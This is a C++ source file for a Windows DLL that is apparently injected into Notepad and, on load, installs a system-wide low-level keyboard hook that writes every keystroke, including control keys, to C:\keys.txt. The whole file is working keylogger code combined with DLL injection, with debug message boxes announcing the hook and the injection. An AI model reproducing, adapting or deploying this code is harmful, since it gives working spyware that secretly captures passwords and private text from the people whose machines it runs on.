// NotepadDll.cpp : Defines the entry point for the DLL application.
#define _WIN32_WINNT 0x0500  
#include<stdio.h>
#include<windows.h>
#include<stdlib.h>
#include<fstream>
using namespace std;

bool HOOKED = false;

HHOOK keyboardHook;

ofstream out("C:\\keys.txt", ios::out);
HINSTANCE hins;
HMODULE hModule;


LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) 
{
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);

	if (wParam == WM_KEYDOWN)
	{
		switch (p->vkCode)
		{
			case VK_CAPITAL:	out << "<CAPLOCK>"; break;
			case VK_SHIFT:		out << "<SHIFT>"; break;
			case VK_LCONTROL:	out << "<LCTRL>"; break;
			case VK_RCONTROL:	out << "<RCTRL>"; break;
			case VK_INSERT:		out << "<INSERT>"; break;
			case VK_END:		out << "<END>"; break;
			case VK_PRINT:		out << "<PRINT>"; break;
			case VK_DELETE:		out << "<DEL>"; break;
			case VK_BACK:		out << "<BK>"; break;
			case VK_LEFT:		out << "<LEFT>"; break;
			case VK_RIGHT:		out << "<RIGHT>"; break;
			case VK_UP:			out << "<UP>"; break;
			case VK_DOWN:		out << "<DOWN>"; break;
			
			default:			out << char(tolower(p->vkCode));
		}
	}

	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

BOOL Function()
{
	return TRUE;
}

//================================================================
unsigned long GetTargetProcessIdFromWindow(TCHAR *className, TCHAR *windowName)
{
    HWND targetWnd;
//  HANDLE hProcess;
    unsigned long processID = 0;

    targetWnd = FindWindow(className, windowName);
    return GetWindowThreadProcessId(targetWnd, &processID);
}
//================================================================

BOOL APIENTRY DllMain( HINSTANCE hinstDLL, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:

			if (!HOOKED)
			{
				hins = hinstDLL;
				TCHAR lpszTID[0x100];
				/*
				TCHAR text[] = TEXT("it works!");
				HWND hNotepadWnd = FindWindow(NULL,  "Untitled - Notepad");
				if(hNotepadWnd == NULL)
				{
					printf("Fail FindWindow\n");
					return 1;
				}
				SendMessage(hNotepadWnd, WM_SETTEXT, 0, (LPARAM)text);
				CloseHandle(hNotepadWnd);
				*/
				unsigned long threadID = GetTargetProcessIdFromWindow(TEXT("Notepad"), TEXT("Untitled - Notepad"));
				wsprintf(lpszTID, TEXT("TID: %d"), threadID);
				MessageBox(NULL, lpszTID, TEXT("TID"), MB_OK);

				hModule = GetModuleHandle(0);
				if (NULL == hModule)
				{
					wsprintf(lpszTID, TEXT("GetModuleHandle Failed: %d"), GetLastError());
					MessageBox(NULL, lpszTID, TEXT("keyboardHook"), MB_OK);
				}

				keyboardHook = SetWindowsHookEx(
											WH_KEYBOARD_LL,
											keyboardHookProc,
											hModule,//hins,
											0//threadID
											);

				wsprintf(lpszTID, TEXT("keyboardHook: %d = %d"), keyboardHook, GetLastError());
				MessageBox(NULL, lpszTID, TEXT("keyboardHook"), MB_OK);

				MessageBox(NULL,TEXT("INJECTED"), TEXT("DLL"), MB_OK);

				HOOKED = true;
			}

		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}

	return TRUE;
}